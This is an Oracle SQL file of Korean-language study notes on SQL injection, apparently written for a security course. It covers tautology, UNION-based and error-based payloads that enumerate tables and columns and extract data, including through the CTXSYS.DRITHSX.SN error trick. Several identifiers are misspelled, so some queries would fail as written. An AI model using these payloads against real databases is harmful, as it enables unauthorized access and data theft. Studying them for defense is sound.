
-- SQL 삽입공격 예제
SELECT * FROM STUDENT
WHERE STDNO='2023005' OR 1=1 --';

-- UNION
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='1'
UNION
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='2';

-- 컬럼 타입이 동일하며s UNION 결합 가능
-- 첫번째 SELECT 절 고객번호, 두번째 SELECT 절 도서 번호를 추출
-- 고객번호와 도서번호 컬럼 타입이 동일하므로 UNION 진행
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='1'
UNION
SELECT bookNo, bsQty FROM bookSale WHERE client no='2';

-- 컬럼타입이 다른 경우-> 오류발생 (bsQty, bsDate 타입 다름)
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='1'
UNION
SELECT clientNo, bsDate FROM bookSale WHERE clientNo='2';

-- 여러 테이블에서 조회 결과 결합 가능 
-- booksale 테이블의 조회 결과와 book 테이블의 조회 결과 결합 가능
-- book 테이블의 null 과 결합: null 과 결합시 컬럼 타입에 대한 오류는 없음 
-- 결과에서 확인 가능한 정보는 book 테이블의 컬럼은 최소 3개 이상
-- union all 이용시 book 테이블의 레코드는 22개
-- book 테이블의 내용을 잘 몰라도 정보를 얻을 수 있음
SELECT clientNo, bsQty, bookNo FROM bookSale WHERE clientNo='2'
UNION
SELECT null, null, null, null, null FROM book;

-- order by 절 사용
-- 조회하지 않은 컬럼으로도 정렬 가능
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='2' ORDER BY bsQty; -- 조회하는 컬럼 기준 정렬
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='2' ORDER BY bookNo; -- 조회하지 않은 컬럼 기준 정렬
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='2' ORDER BY 1; -- 첫번째 컬럼(idx) 기준 정렬
SELECT clientNo, bsQty FROM bookSale WHERE clientNo='2' ORDER BY 6; -- error 존재하지 않는 컬럼
-- idx 가 존재하지 않아 오류가 발생하면 해당 테이블의 컬럼 수는 idx 보다 작다는 걸 알 수 있음

-- 오라클은 DUAL 이라는 임시테이블 사용 가능
-- UNION 을 통한 Injection 공격을 통해 컬럼의 데이터 타입을 사용해보려는 시도
SELECT * FROM student WHERE stdNo=' ' or 1=1
UNION
SELECT 'A', null, null, null, null FROM dual;

-- 두번째 컬럼 타입 문자열
SELECT * FROM student WHERE stdNo=' ' or 1=1
UNION
SELECT 'A', 'A', null, null, null FROM dual;

-- error 세번째 컬럼 타입은 문자열이 아님
SELECT * FROM student WHERE stdNo=' ' or 1=1
UNION
SELECT 'A', 'A', 'A', null, null FROM dual;

SELECT * FROM student WHERE stdNo=' ' or 1=1
UNION
SELECT 'A', 'A', 1, null, null FROM dual; -- 정수 타입 매칭 후 결합 성공-> 세번째 컬럼 타입은 정수형


-- USER_TABLE 확인
SELECT * FROM USER_TABLE;

SELECT TABLE_NAME, null, null, null, null FROM USER_TABLES;
-- TABLE_NAME 이 문자열이므로 프로그램에서 사용하는 쿼리의 문자열 컬럼 자리에 매칭
-- 세번째, 다섯번째 컬럼을 제외한 나머지는 문자열임

SELECT * FROM student WHERE stdNo='' or 1=1 
UNION 
SELECT TABLE_NAME, null, null, null, null FROM USER_TABLES -- ;
-- 해당 입력값에 대한 공격 성공으로 DB 사용자 생성 테이블명 확인
-- 보통 member, client 등 과 같은 테이블 명이 사용자 정보를 가지고 있음
-- => STUDENT 테이블을 이용한 공격

-- ALL_TAB_COLUMNS 
SELECT * FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='student';

SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT COLUMN_NAME, null, null, null, null FROM ALL_TAB_COLUMNS;


SELECT * FROM student WHERE stdNo=''OR 1=1
UNION
SELECT COLUMNE_NAME, null, null, null, null FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='student';

-- STUDENT 테이블 확인
-- 프로그램에서 번호, 이름, 학년 정보 제공
-- 나머지 정보는 UNION 삽입 공격으로 확인
SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT stdAdress, null, null, null, null FROM student --

-- STDBIRTH 데이터 타입은 STUDENT 테이블의 네번째 컬럼
-- STDBIRTH 오류 없이 추출 되는 공격은 성공, 정보 획득은 불가능
SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT stdAddress, null, null, stdBirth, null FROM student --
-- 앞 3개 컬럼은 출력하고 있음, 3개의 컬럼 중 하나와 매칭해야 함

-- 학년은 NUMBER ::: DATE-> NUMBER 변환해서 매칭
-- DATE 문자열로 변환 가능하면 문자열 변환을 통해 정보획득 시도
-- STDBIRTH 를 문자열로 변환해 추출
-- 오라클 DBMS 내장함수 중 TO_CHAR() 를 이용해 문자열 변경후 결합
SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT TO_CHAR(stdBirth), null, null, null, null FROM student;

-- 현재 사용중인 dbms 정보를 조회하는 쿼리 구문
SELECT banner FROM v$version WHERE banner LIKE '%Oracle%';

-- 위 쿼리에서 사용하는 객체에 대한 권한은 없지만 해당 권한을 갖고있는 프로시저를 이용하면 간접확인 가능
-- CTXSYS.DIRTHSX.SN(user, (subquery)) 프로시저 활용: v$version select 권한을 가지고 있음
-- 서브쿼리의 결과가 프로시저가 원하는 형식이 아니기 때문에 오류는 발생함 
-- 발생된 오류에 서브쿼리 결과를 확인할 수 있음 - 서브쿼리를 사용하는 프로시저가 진행될때 서브쿼리 결과가 선행됨
SELECT CTXSYS.DIRTHSX.SN(user, (SELECT banner FROM v$version WHERE banner LIKE '%Oracle%')) FROM DUAL;




-- ERROR BASED SQL INJECTION

-- 1 취약점 존재 여부 확인
-- 사용자 입력값에 ‘ 등 공격이 시작되는 문자 사용 가능여부 확인
-- ‘ 입력시 에러메시지가 그대로 전달 (에러유발 공격 가능)
-- 단일 인용부 오류 - 쿼리 생성시 ‘ 를 매칭 시키지 않아서 발생


-- ' -- 입력시 정상 진행
-- ** SQL 취약점이 있다

-- 2 SQL 구문 에러를 유발해 반환되는 정보를 통해 데이터베이스의 테이블/컬럼/데이터 개수 확인

-- 데이터베이스 시스템 정보 확인
-- CTXSYS>DIRTHSX.SN(user, (subquery))
-- CTXSYS>DIRTHSX.SN(user, (select banner from v$version where banner like ‘%Oracle%’))

-- 오라클이 제공하는 system table 사용 가능함

SELECT TABLE_NAME
FROM (SELECT TABLE_NAME, ROWNUM_AS_RNUM FROM USER_TABLES)
WHERE RNUM=1;
-- row_num 키워드를 통해 테이블 구별자 생성 가능

-- ' OR CTXSYS.DRITHSX.SN(USER, (SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM USER_TABLES) WHERE RNUM=17))=1 —
-- 결과: DRG-11701 MEMBER 키워드 사전이 존재하지 않습니다
-- 해당 에러 메시지를 통해 MEMBER 테이블명 확인 가능

-- rownum 을 1씩 증가시키면서 민감정보 저장으로 추정되는 테이블 확인
-- member, client, user, join ...

-- ROWNUM 같은 키워드 또한 필터링 추가


-- 공격 목표 테이블을 결정했으면 해당 테이블의 컬럼 확인
-- Book 테이블로 결정-> 컬럼 확인 공격
-- 오라클 시스템 테이블 중 ALL_TAB_COLUMNS 를 통해 컬럼 수 확인
-- ' OR CTXSYS.DIRTHSX.SN(user, (SELECT COLUMN_NAME FROM ALL_TAB_COLUMNES WHERE TABLE_NAME='BOOK'))=1 --

SELECT COLUMNE_NAME
FROM (SELECT COLUMN_NAME, ROWNUM AS RNUM, FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='BOOK')
WHERE RNUM=1
-- BOOK 테이블의 컬럼을 하나씩 확인할 수 있음

-- DRG-11071: BOOKNO 키워드 사전이 존재하지 않습니다.
-- 컬럼명 확인